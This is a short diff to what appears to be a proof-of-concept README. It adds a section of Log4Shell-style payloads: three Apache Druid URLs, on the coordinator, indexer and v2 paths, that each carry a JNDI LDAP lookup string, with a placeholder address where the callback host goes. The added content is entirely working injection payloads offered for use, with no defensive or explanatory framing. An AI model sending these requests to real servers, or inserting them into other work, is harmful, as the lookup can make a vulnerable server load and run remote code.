@@ -32,3 +32,18 @@ Log
 I've tested it
 
 ![](1.png)
+
+## Other Pocs
+
+```
+http://0.0.0.0:8888/druid/coordinator/${jndi:ldap://0.0.0.0/123}
+```
+
+```
+http://0.0.0.0:8888/druid/indexer/${jndi:ldap://0.0.0.0/123}
+```
+
+```
+
+http://0.0.0.0:8888/druid/v2/${jndi:ldap://0.0.0.0/123}
+```
